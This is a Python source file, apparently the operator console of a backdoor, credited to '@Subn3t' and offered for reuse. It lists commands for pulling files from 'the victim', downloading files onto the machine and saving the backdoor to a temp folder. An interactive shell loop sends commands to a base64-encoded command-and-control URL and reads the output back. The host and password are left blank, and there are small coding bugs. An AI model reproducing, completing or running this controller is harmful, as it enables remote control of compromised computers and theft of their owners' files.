'''

- Backdoor Controller coded by @Subn3t
- Version: 1.0.4
- GitHub: https://github.com/gdsubn3t/Backdoor/
- Telegram: @subn3t
- You can use this code, but please give credits.
- Have fun and stay legal!

'''

import requests, sys, time, base64, platform, os

# Colors Formatting
HEADER = '\033[95m'
OKBLUE = '\033[94m'
OKGREEN = '\033[92m'
WARNING = '\033[93m'
WHITE = '\033[97m'
FAIL = '\033[91m'
ENDC = '\033[0m'

# info
info = '''
Command list: 

:download <url> <filename.extension>     Download a file from a url.
:save                                    Save the backdoor into the tmp folder.
:get <filename.extension>                Get a file from the victim.

:exit                                    Breaks the connection to the backdoor.
'''

system = platform.system()


def b64(): # url encryption
	
	output = ''
	host = ''
	pwd = ''
	shell(host, output, pwd)


def shell(host, output, pwd):
	# send a request to get the welcome
	welcome = False
	cmd = ':welcome'
	payload = { 'pwd':base64.b64decode(pwd).decode('utf-8') , 'cmd':cmd}
	r = requests.post(base64.b64decode(host).decode('utf-8') , data=payload)
	#print(payload)
	
	while welcome != True: # if welcome is false:
		response = requests.get(base64.b64decode(output).decode('utf-8')).text # send a request to get it
		
		if '<welcome>' in response: # if <welcome> tag in the response
			key, ip = response.split(' ') # split the welcome and get ip
			welcome = True
	
	print("\033[97mGot Connection from\033[94m "+ ip + WHITE)

	oldcmd = ''
	cmd = ''
	# clear the filecmd
	payload = { 'pwd':base64.b64decode(pwd).decode('utf-8') , 'cmd':cmd}
	r = requests.post(base64.b64decode(host).decode('utf-8') , data=payload)
	try:
		# shell begins
		while True:
			cmd = input(OKBLUE + "Shell" + WHITE +"> ")
			if not cmd == ':exit':
				if not cmd == oldcmd:
					if cmd == ':info':

						print(info)
						
					else:

						payload = { 'pwd':base64.b64decode(pwd).decode('utf-8') , 'cmd':cmd}
						r = requests.post(base64.b64decode(host).decode('utf-8') , data=payload)
						#requests.post(host, data={ 'pwd':pwd, 'cmd':cls})
						if r.status_code == 200:
							time.sleep(3)
							response = requests.get(base64.b64decode(output).decode('utf-8')).text
							print('\n' + OKBLUE + response)
							oldcmd = cmd
						else:
							print(RED + "Error while getting response, Status code:". r.status_code)	

			else:
				payload = { 'pwd':base64.b64decode(pwd).decode('utf-8') , 'cmd':cmd}
				r = requests.post(base64.b64decode(host).decode('utf-8') , data=payload)
				sys.exit()
	except KeyboardInterrupt:
		print(FAIL + "\nUser Quitted Connection")
		sys.exit()

if __name__ in "__main__":
	b64()
